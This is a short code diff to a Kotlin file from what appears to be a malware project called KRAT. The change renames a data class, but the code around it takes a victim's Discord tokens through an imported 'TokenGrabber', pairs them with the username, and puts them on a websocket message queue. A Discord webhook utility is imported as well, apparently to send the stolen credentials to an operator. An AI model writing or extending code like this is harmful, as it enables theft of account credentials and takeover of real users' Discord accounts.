@@ -1,10 +1,10 @@
 package services
 
 import KRAT.user
+import models.informations.DiscordAccount
 import services.discord.TokenGrabber.getTokens
 import utils.DiscordWebhook
 import utils.ListUtils.removeDuplicates
-import websocket.DiscordInformation
 import websocket.messagesQueue
 
 object Discord {
@@ -19,7 +19,7 @@ object Discord {
         if (tokens.isNullOrEmpty()) return
 
         messagesQueue.add(
-            DiscordInformation(
+            DiscordAccount(
                 username = user,
                 tokens = tokens
             )
